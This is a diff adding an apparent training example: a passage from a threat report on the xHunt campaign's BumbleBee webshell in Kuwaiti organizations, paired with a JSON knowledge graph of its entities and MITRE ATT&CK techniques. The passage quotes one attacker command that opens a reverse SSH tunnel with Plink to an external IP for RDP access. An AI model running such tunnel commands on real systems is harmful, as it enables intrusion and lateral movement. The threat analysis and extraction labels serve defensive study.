@@ -1,0 +1,134 @@
+
+
+
+Sentence : Commands Executed via BumbleBee
+As we previously mentioned, the compromised Exchange server of a Kuwaiti organization
+does not log the POST data within the IIS logs, so we were unable to extract the
+commands run on the BumbleBee webshell. However, we used overlapping timestamps to
+correlate the activity in the IIS logs with the command prompt activity seen in Cortex
+https://unit42.paloaltonetworks.com/bumblebee-webshell-xhunt-campaign/ 5/21
+8/15/22, 3:40 PM xHunt Campaign: New BumbleBee Webshell and SSH Tunnels Used for Lateral Movement
+XDR logs to determine the commands executed on the server. Unfortunately, we did not
+have visibility into the commands executed on BumbleBee until Sept. 16, 2020, when
+Cortex XDR was installed on the compromised Exchange server in response to the
+suspicious activity. We were also able to determine the commands run on the BumbleBee
+webshell hosted on the internal IIS web server at one of the two other Kuwaiti
+organizations as well.
+Based on the Cortex XDR logs, the actor spent three hours and 37 minutes on Sept. 16,
+2020, running commands via the BumbleBee webshell installed on the compromised
+Exchange server. Table 2 in the Appendix shows all the commands and the MITRE
+ATT&CK technique identifiers that best describe the activities carried out. The commands
+show the actor:
+1. Performing network discovery (T1018) using ping and net group commands, as well
+as PowerShell (T1059.001), to find additional computers on the network.
+2. Performing account discovery (T1087) using the whoami and quser commands.
+3. Determining the system time (T1124) using the W32tm and time commands.
+4. Creating an SSH tunnel (T1572) using Plink (RTQ.exe) to a remote host.
+5. Using RDP (T1021.001) over the SSH tunnel to control the compromised computer.
+6. Laterally moving (T1570) to another system by mounting a shared folder, copying
+Plink (RTQ.exe) to a remote system and using Windows Management
+Instrumentation (WMI) (T1047) to create an SSH tunnel for RDP access.
+7. Removing evidence of their presence by deleting (T1070.004) BumbleBee after they
+were done issuing commands.
+The commands listed in Table 2 in the Appendix also show the actor using Plink
+(RTQ.exe) to create an SSH tunnel to an external IP address 192.119.110[.]194, as seen in
+the following command:
+echo y | c:\windows\temp\RTQ.exe 192.119.110[.]194 -C -R 0.0.0.0:8081:<redacted IP
+2>:3389 -l bor -pw 123321 -P 443
+The IP address overlaps with other related infrastructure that we will discuss in a later
+section of this blog. Most importantly, the username and password of bor and 123321
+used to create the SSH tunnel overlaps directly with prior xHunt activity. These exact
+credentials were listed within the cheat sheet found within the Sakabota tool, which
+provided an example command that the actor could use to create SSH tunnels using
+Plink. We believe the actor used the example command from the cheat sheet as a basis for
+the commands they used to create the SSH tunnels via BumbleBee.
+The actor creates these SSH tunnels to connect to non-internet accessible RDP services
+on the Windows system, specifically to use RDP to interact with the compromised system
+and to use Graphical User Interface (GUI) applications. The actor also uses these SSH
+tunnels to move laterally to other systems on the network, specifically to access internal
+systems that are not remotely accessible from the internet, as depicted in Figure 2.
+https://unit42.paloaltonetworks.com/bumblebee-webshell-xhunt-campaign/ 6/21
+8/15/22, 3:40 PM xHunt Campaign: New BumbleBee Webshell and SSH Tunnels Used for Lateral Movement
+Figure 2. Visualization of xHunt actor accessing an internal system from an SSH tunnel created on the
+internet accessible server hosting BumbleBee.
+In addition to analyzing commands executed on the compromised Exchange server, we
+also analyzed the commands executed on the BumbleBee webshell at an internal IIS web
+server hosted at one of the two other Kuwaiti organizations. On Sept. 10, 2020, we found
+that the actor ran several commands to perform network and user account discovery.
+Additionally, the actor used BumbleBee to upload a second webshell with a filename of
+cq.aspx. The actor used this second webshell to run a PowerShell script that issued SQL
+queries to a Microsoft SQL Server database.
+The actor first issued a SQL query to check the version of SQL server, followed by the
+actor issuing two additional queries that were very specific to the web application running
+on the IIS web server. The PowerShell script used to issue the SQL queries is very similar
+to scripts that were included in a Microsoft Technet forum post titled Running SQL via
+PowerShell, which suggests the actor may have used this forum post as a basis for the
+PowerShell script. We were unable to obtain the second webshell, as the actor deleted it
+via the BumbleBee webshell when they were finished. Table 3 in the Appendix shows the
+commands executed via BumbleBee on Sept. 10, 2020.
+The logs on the IIS web server hosting the BumbleBee webshell used to issue the
+commands in Table 3 only included internal IP addresses for the source of the activity.
+The internal IP addresses suggested this web server was not publicly accessible and did
+not expose the actor’s source IP address. However, all of the attempts to access
+BumbleBee and run the commands in Table 3 had 192.119.110[.]194:8083 as the host in
+the URL of the referrer field within the web server logs. This external IP address in the
+referrer field suggests that the actor was accessing BumbleBee via an SSH tunnel. The IP
+address in the referrer field is also the same as in the command issued to create the SSH
+tunnels for RDP access that we observed on the compromised Exchange server, as shown
+in Table 2.
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "BumbleBee webshell", "type" : "EXEF"},
+        {"id": 2, "description": "Exchange server of a Kuwaiti organization", "type" : "SYSP"},
+        {"id": 3, "description": "Cortex XDR", "type" : "APPS"},
+        {"id": 4, "description": "Compromised Exchange server", "type" : "SYSP"},
+        {"id": 5, "description": "Post data within IIS logs", "type" : "DOCF"},
+        {"id": 6, "description": "Command prompt activity seen in Cortex XDR logs", "type" : "DOCF"},
+        {"id": 7, "description": "Commands executed on the server", "type" : "TTPS"},
+        {"id": 8, "description": "Network discovery (T1018)", "type" : "TTPS"},
+        {"id": 9, "description": "Account discovery (T1087)", "type" : "TTPS"},
+        {"id": 10, "description": "Determining the system time (T1124)", "type" : "TTPS"},
+        {"id": 11, "description": "Creating an SSH tunnel (T1572) using Plink (RTQ.exe)", "type" : "TTPS"},
+        {"id": 12, "description": "Using RDP over the SSH tunnel to control the compromised computer (T1021.001)", "type" : "TTPS"},
+        {"id": 13, "description": "Laterally moving to another system (T1570)", "type" : "TTPS"},
+        {"id": 14, "description": "Mounting a shared folder", "type" : "TTPS"},
+        {"id": 15, "description": "Copying Plink (RTQ.exe) to a remote system", "type" : "TTPS"},
+        {"id": 16, "description": "Using Windows Management Instrumentation (WMI) (T1047)", "type" : "TTPS"},
+        {"id": 17, "description": "Removing evidence of their presence by deleting BumbleBee after they were done issuing commands (T1070.004)", "type" : "TTPS"},
+        {"id": 18, "description": "External IP address 192.119.110[.]194", "type" : "CCSH"},
+        {"id": 19, "description": "Command to create SSH tunnel using Plink (RTQ.exe)", "type" : "EXEF"},
+        {"id": 20, "description": "Non-internet accessible RDP services on the Windows system", "type" : "APPS"},
+        {"id": 21, "description": "xHunt actor accessing an internal system from an SSH tunnel created on the internet accessible server hosting BumbleBee", "type" : "TTPS"},
+        {"id": 22, "description": "Internal IIS web server hosted at one of the two other Kuwaiti organizations", "type" : "SYSP"},
+        {"id": 23, "description": "Second webshell with a filename of cq.aspx", "type" : "EXEF"},
+        {"id": 24, "description": "PowerShell script that issued SQL queries to a Microsoft SQL Server database", "type" : "TTPS"},
+        {"id": 25, "description": "SQL query to check the version of SQL server", "type" : "TTPS"},
+        {"id": 26, "description": "Additional SQL queries specific to the web application running on the IIS web server", "type" : "TTPS"},
+        {"id": 27, "description": "Microsoft Technet forum post titled Running SQL via PowerShell", "type" : "DOCF"},
+        {"id": 28, "description": "Commands executed via BumbleBee on Sept. 10, 2020", "type" : "TTPS"}
+    ],
+    "edges": [
+        {"source": 4, "target": 5, "rel_name" : "not log"},
+        {"source": 6, "target": 7, "rel_name" : "correlate to"},
+        {"source": 7, "target": 8, "rel_name" : "includes"},
+        {"source": 7, "target": 9, "rel_name" : "includes"},
+        {"source": 7, "target": 10, "rel_name" : "includes"},
+        {"source": 7, "target": 11, "rel_name" : "includes"},
+        {"source": 7, "target": 12, "rel_name" : "includes"},
+        {"source": 7, "target": 13, "rel_name" : "includes"},
+        {"source": 7, "target": 14, "rel_name" : "includes"},
+        {"source": 7, "target": 15, "rel_name" : "includes"},
+        {"source": 7, "target": 16, "rel_name" : "includes"},
+        {"source": 7, "target": 17, "rel_name" : "includes"},
+        {"source": 11, "target": 18, "rel_name" : "to IP address"},
+        {"source": 11, "target": 19, "rel_name" : "uses command"},
+        {"source": 12, "target": 20, "rel_name" : "to access services on"},
+        {"source": 21, "target": 4, "rel_name" : "via server hosting"},
+        {"source": 22, "target": 7, "rel_name" : "executes commands via"},
+        {"source": 23, "target": 22, "rel_name" : "uploaded to"},
+        {"source": 24, "target": 25, "rel_name" : "includes query"},
+        {"source": 24, "target": 26, "rel_name" : "includes queries"},
+        {"source": 27, "target": 24, "rel_name" : "as basis for script"}
+    ]
+}
